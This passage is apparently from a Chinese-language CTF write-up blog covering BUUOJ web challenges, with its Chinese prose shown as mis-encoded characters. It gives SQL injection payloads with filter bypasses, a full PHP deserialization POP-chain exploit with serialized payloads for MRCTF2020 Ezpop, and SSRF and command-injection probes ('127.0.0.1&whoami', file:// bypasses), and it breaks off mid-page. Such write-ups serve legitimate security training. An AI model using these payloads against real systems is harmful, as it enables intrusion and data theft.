class="language-none">1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201213173634852.png" class="" title="image-20201213173634852" loading="lazy"><p>è¡¨å<code> FLAG_TABLE</code>,<code>news</code>,<code>users</code>,<code>gtid_slave_pos</code>,<code>ads</code>,<code>users </code></p><h5 id="æ— åˆ—åæ³¨å…¥"><a href="#æ— åˆ—åæ³¨å…¥" class="headerlink" title="æ— åˆ—åæ³¨å…¥"></a>æ— åˆ—åæ³¨å…¥</h5><pre class="language-none"><code class="language-none">1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(a)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;a&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><p>åŸå‹</p><pre class="language-none"><code class="language-none">1&#39;union select 1,(select group_concat(a) from(select 1,2,3 as a union select * from users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><p>2å¤„æ˜¯å›æ˜¾ç‚¹ï¼Œæ‰€ä»¥å¯¹2å‡ºæ³¨å…¥ï¼Œé¦–å…ˆè”åˆæŸ¥è¯¢</p><p>ç„¶ååˆ†æ<code>(select group_concat(a) from(select 1,2,3 as a union select * from users)x)</code></p><p>ç¡®è®¤usersåˆ—åœ¨web1ä¸­ï¼Œæ…¢æ…¢è¯•ï¼Œæ— åˆ—åæ³¨å…¥è¡¨çš„åˆ—æ•°ä¸ç›¸åŒä¼šæŠ¥é”™ï¼Œæœ€åå‘ç°usersé‡Œæœ‰ä¸‰åˆ— </p><p>é‡‡ç”¨çš„å­æŸ¥è¯¢çš„æ–¹å¼ï¼Œå­æŸ¥è¯¢æ˜¯å°†ä¸€ä¸ªæŸ¥è¯¢è¯­å¥åµŒå¥—åœ¨å¦ä¸€ä¸ªæŸ¥è¯¢è¯­å¥ä¸­ï¼Œåœ¨ç‰¹å®šçš„æƒ…å†µä¸‹ï¼Œä¸€ä¸ªæŸ¥è¯¢è¯­å¥çš„æ¡ä»¶éœ€è¦å¦ä¸€ä¸ªæŸ¥è¯¢è¯­å¥æ¥è·å–ï¼Œå†…å±‚æŸ¥è¯¢è¯­å¥çš„æŸ¥è¯¢ç»“æœï¼Œå¯ä»¥ä¸ºå¤–å±‚æŸ¥è¯¢è¯­å¥æä¾›æŸ¥è¯¢æ¡ä»¶ã€‚ </p><p><code>(select 1,2,3 as a union select * from users)</code></p><p>å°†usersè¿™ä¸ªè¡¨é‡Œé¢çš„æŸ¥è¯¢çš„ç»“æœæä¾›ç»™å¤–éƒ¨æŸ¥è¯¢ï¼ŒåŒæ—¶æŠŠåˆ—åè½¬æ¢æˆaï¼Œç›´æ¥<code>group_concat(a)</code>å¯å¾—ç»“æœ</p><img src="/article/Buuoj-WEB-Write-up/image-20201213175809048.png" class="" title="image-20201213175809048" loading="lazy"><hr><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><h5 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h5><p>å…ˆä¸Šæºç </p><pre class="language-php" data-language="php"><code class="language-php">Welcome to index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag is in flag.php</span><span class="token comment">//WTF IS THIS?</span><span class="token comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><span class="token comment">//And Crack It!</span><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Welcome to '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ä¸‰ä¸ªç±»</p><p><code>Modifier</code>ï¼Œ<code>Show</code>ï¼Œ<code>Test</code></p><p>é€ä¸ªåˆ†æï¼Œé¦–å…ˆè·¯å£é¢˜ç›®ç»™äº†ä»<code>Show</code>ï¼Œå¯èƒ½ä¸å¯¹ï¼Œä½†è¿˜æ˜¯å…ˆä»<code>Show</code>çœ‹</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Welcome to '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ä¸‰ä¸ªé­”æœ¯æ–¹æ³•</p><pre class="language-php" data-language="php"><code class="language-php">__constructï¼šå½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è°ƒç”¨__toStringï¼šå½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¢«è°ƒç”¨__wakeupï¼šååºåˆ—åŒ–æ—¶è§¦å‘</code></pre><p>ä»<code>Show</code>å…¥å£ï¼Œä¼šè°ƒç”¨<code>__wakeup</code>é­”æœ¯æ–¹æ³•ï¼Œæ–¹æ³•é‡Œå°†<code>$this-&gt;source</code>åšå­—ç¬¦ä¸²åœ¨<code>preg_match</code>å‡½æ•°é‡Œæ¯”è¾ƒï¼Œ å¦‚æœ<code>$this-&gt;source</code>æ˜¯Showç±»ï¼Œè¿™æ—¶ä¼šè°ƒç”¨<code>__toString</code>æ–¹æ³•ã€‚</p><p>å†çœ‹<code>Modifier</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ä¸€ä¸ªé­”æœ¯æ–¹æ³•</p><pre class="language-none"><code class="language-none">__invokeï¼šå°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</code></pre><p>å¾ˆæ˜æ˜¾çš„æ–‡ä»¶åŒ…å«<code>include</code>ï¼Œè¿™ä¸ªç±»å°±æ˜¯æœ€ç»ˆè¦è¯»å–<code>flag.php</code>çš„æ—¶å€™ä½¿ç”¨çš„äº†ï¼Œæˆ‘ä»¬è¦è®©<code>Modifier</code>è¢«å½“åšå‡½æ•°è°ƒç”¨ï¼Œè¿™æ—¶å°±ä¼šè°ƒç”¨<code>__invoke</code>æ–¹æ³•ï¼Œä»è€Œè°ƒç”¨<code>append</code>å‡½æ•°ï¼Œè¿›è¡Œæ–‡ä»¶åŒ…å«ã€‚</p><p>æœ€åçœ‹<code>Test</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ä¸¤ä¸ªé­”æœ¯æ–¹æ³•</p><pre class="language-none"><code class="language-none">__constructï¼šå½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è°ƒç”¨__getï¼šç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</code></pre><p>å¾ˆå…³é”®çš„<code>__get</code>é­”æœ¯æ–¹æ³•ï¼Œè¿™é‡Œä¼šè¿”å›<code>$this-&gt;p</code>å³<code>$function()</code>ä½œä¸ºå‡½æ•°è°ƒç”¨ï¼Œè€Œæˆ‘ä»¬æ°å¥½éœ€è¦è®©<code>Modifier</code>è¢«å½“åšå‡½æ•°è°ƒç”¨ï¼Œåªè¦åœ¨<code>Show</code>é‡Œå®ä¾‹åŒ–<code>Test</code>ç±»ï¼Œè¿™æ ·ä¸€æ¥ä¸€æ¡popé“¾å°±å½¢æˆäº†ã€‚</p><h6 id="popé“¾"><a href="#popé“¾" class="headerlink" title="popé“¾"></a>popé“¾</h6><p>ä»<code>Show</code>å…¥æ‰‹ï¼Œå…ˆååºåˆ—åŒ–å‡½æ•°è§¦å‘<code>Show</code>ç±»ä¸­<code>__wakeup</code>æ–¹æ³•ï¼Œæ–¹æ³•å†…è°ƒç”¨å‡½æ•°è§¦å‘<code>__tosring</code>æ–¹æ³•ï¼Œ<code>__tosring</code>ä¸­å°†<code>str</code>å®ä¾‹åŒ–ä¸º<code>Test</code>ç±»ï¼Œè€Œ<code>Test</code>ç±»ä¸­æ²¡æœ‰<code>source</code>å±æ€§ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨<code>__get</code>æ–¹æ³•ï¼Œ å°†<code>function</code>å®ä¾‹åŒ–ä¸º<code>Modifier</code>ç±»ï¼Œè§¦å‘<code>Modifier</code>ä¸­çš„<code>__invoke</code>æ–¹æ³•ï¼Œæœ€ç»ˆè°ƒç”¨<code>include</code>å‡½æ•°æ–‡ä»¶åŒ…å«<code>flag.php</code></p><p>payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token double-quoted-string string">"php://filter/convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token double-quoted-string string">"123"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//Show()->__wakeup()->__tostring()->str->Test->__get()->Modefier->__invoke()->"flag.php"</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\r\n"</span><span class="token punctuation">;</span><span class="token comment">//O:4:"Show":2:&#123;s:6:"source";O:4:"Show":2:&#123;s:6:"source";s:3:"123";s:3:"str";O:4:"Test":1:&#123;s:1:"p";O:8:"Modifier":1:&#123;s:6:" * var";s:52:"php://filter/convert.base64-encode/resource=flag.php";&#125;&#125;&#125;s:3:"str";N;&#125;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A3%3A%22123%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span></span></code></pre><p>è¿™é‡Œè¿˜æœ‰å°æ³¨æ„ç‚¹ï¼Œé¢˜ç›®ä¸­çš„phpç‰ˆæœ¬ä¸º 5.6.40 ï¼Œè¿™ä¸ªç‰ˆæœ¬ååºåˆ—åŒ–å¯¹äº<code>protected</code>ä¸<code>public</code>ç±»åˆ«è¿˜æ˜¯æ•æ„Ÿçš„ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯æœ‰<code>%00</code>å­˜åœ¨çš„</p><img src="/article/Buuoj-WEB-Write-up/image-20201218135255308.png" class="" title="image-20201218135255308" loading="lazy"><p>å¯è§å­—ç¬¦4ä¸ªï¼Œå‰åéƒ½æ˜¯<code>%00</code>ï¼Œè¿™æ—¶é€šè¿‡æ•°æ®è¡¨ä¼ å‚å¯èƒ½ä¼šä¸å‡†ç¡®ï¼Œä¾‹å¦‚æˆ‘æœ¬åœ°è°ƒä¼šæ˜¾ç¤ºå¦‚ä¸‹</p><img src="/article/Buuoj-WEB-Write-up/image-20201218135449017.png" class="" title="image-20201218135449017" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201218135521199.png" class="" title="image-20201218135521199" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201218135543020.png" class="" title="image-20201218135543020" loading="lazy"><p>æ‰€ä»¥æˆ‘ä»¬æœ€åè¿›è¡Œ<code>urlencode</code>ï¼Œä¿è¯<code>%00</code>æ­£å¸¸ä¼ å…¥</p><img src="/article/Buuoj-WEB-Write-up/image-20201218135722862.png" class="" title="image-20201218135722862" loading="lazy"><p>æœ€ååŒ…å«<code>flag.php</code>ï¼Œæ‹¿åˆ°flag</p><hr><h2 id="GKCTF2020-EZä¸‰å‰‘å®¢-EzWeb"><a href="#GKCTF2020-EZä¸‰å‰‘å®¢-EzWeb" class="headerlink" title="[GKCTF2020]EZä¸‰å‰‘å®¢-EzWeb"></a>[GKCTF2020]EZä¸‰å‰‘å®¢-EzWeb</h2><h5 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h5><p>æ‰“å¼€é¢˜ç›®</p><img src="/article/Buuoj-WEB-Write-up/image-20201223182110711.png" class="" title="image-20201223182110711" loading="lazy"><p>è·Ÿurlæœ‰å…³ï¼Œå¯èƒ½æ˜¯ssrfï¼Œå‘½ä»¤æ‰§è¡Œç­‰ï¼Œå…ˆè¾“å…¥<code>127.0.0.1&amp;whoami</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201223182233706.png" class="" title="image-20201223182233706" loading="lazy"><p>è¢«banï¼ŒæŸ¥çœ‹æºç å‘ç°æç¤º<code>?secret</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201223182323977.png" class="" title="image-20201223182323977" loading="lazy"><p>å‘ç°æ˜¯linuxå‘½ä»¤<code>ifconfig</code>å†…å®¹ï¼Œè€ƒç‚¹åº”è¯¥æ˜¯ssrfæ‰“å†…ç½‘</p><p>å°è¯•ç”¨<code>file:/</code>è¯»å–æ–‡ä»¶å‘ç°è¢«banï¼Œä½¿ç”¨ <code>fileï¼š/</code>ã€<code>file:&lt;ç©ºæ ¼&gt;///</code> ç»•è¿‡</p><p>è¯»åˆ°æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//echo $url."\n";</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">,</span><span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//var_dump($match);</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'åˆ«è¿™æ ·'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'ifconfig'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>banäº†<code>file://</code>ï¼Œ<code>dict://</code>ï¼Œ<code>127.0.0.1</code>å’Œ<code>localhost</code>ï¼Œåº”è¯¥æ˜¯è¦æ‰¾æœ¬æœºçš„æœåŠ¡ï¼Œçˆ†ç ´ä¸‹å†…ç½‘åŒç½‘æ®µä¸‹å­˜æ´»ä¸»æœº</p><img src="/article/Buuoj-WEB-Write-up/image-20201223182749451.png" class="" title="image-20201223182749451" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201223182807801.png" class="" title="image-20201223182807801" loading="lazy"><p>åœ¨<code>10.138.132.10</code>å‘ç°æç¤ºï¼Œçˆ†ç ´å…¶ç«¯å£ï¼ŒçŒœæµ‹ä¸ºmysqlï¼Œredisä¹‹ç±»çš„æœåŠ¡</p><img src="/article/Buuoj-WEB-Write-up/image-20201223184447546.png" class="" title="image-20201223184447546" 